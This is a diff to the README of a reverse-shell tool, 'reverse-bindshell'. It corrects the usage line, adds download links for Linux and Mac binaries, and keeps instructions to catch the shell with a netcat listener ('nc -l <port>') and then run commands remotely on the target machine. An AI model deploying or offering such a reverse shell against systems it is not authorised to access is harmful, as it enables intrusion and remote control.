@@ -10,7 +10,7 @@
 
 ## Usage
 ```
-./reverse-bindshell host:ip
+./reverse-bindshell host:port
 ```
 
 Before running this, you'll want to be listening on the specified port on an accessible host.
@@ -21,6 +21,10 @@ nc -l <port>
 ```
 
 Now you can enter commands to remotely execute on the machine running `reverse-bindshell`.
+
+## Binary Download
+* [Linux](https://github.com/darnould/reverse-bindshell/releases/download/v1/reverse-bindshell_linux_amd64)
+* [Mac](https://github.com/darnould/reverse-bindshell/releases/download/v1/reverse-bindshell_darwin_amd64)
 
 ## Building
 A single `reverse-bindshell` executable will be produced.
